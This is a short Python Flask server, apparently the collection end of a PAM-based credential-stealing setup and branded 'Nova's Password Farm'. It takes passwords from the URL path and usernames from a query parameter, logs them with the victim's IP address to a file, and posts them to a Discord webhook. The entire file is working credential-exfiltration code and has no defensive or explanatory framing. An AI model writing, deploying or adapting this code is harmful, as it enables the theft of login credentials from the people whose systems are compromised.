from flask import Flask, request
import requests

app = Flask(__name__)

LOG_FILE = "logins.log"
DISCORD_WEBHOOK_URL = ""
def send_to_discord(user, password, ip):
    """Send a structured embed to the Discord webhook."""
    embed = {
        "embeds": [
            {
                "title": "🧑‍🌾 Nova's Password Farm Has Yielded New Crops!",
                "color": 16711680,  # Red color in decimal
                "fields": [
                    {"name": "👤 User", "value": f"`{user}`", "inline": True},
                    {"name": "🔑 Password", "value": f"`{password}`", "inline": True},
                    {"name": "🌐 IP Address", "value": f"```{ip}```", "inline": False}
                ],
                "footer": {"text": "Nova Password Farm"},
            }
        ]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=embed)

@app.route('/<password>', methods=['GET'])
def log_credentials(password):
    client_ip = request.remote_addr
    pam_user = request.args.get('user', 'unknown')  # Capture PAM_USER from query param

    log_entry = f"User: {pam_user}, Password: {password}, IP: {client_ip}\n"

    # Log the data
    with open(LOG_FILE, "a") as log_file:
        log_file.write(log_entry)

    print(log_entry.strip())  # Print to console for monitoring

    send_to_discord(pam_user, password, client_ip)

    return "Logged successfully", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
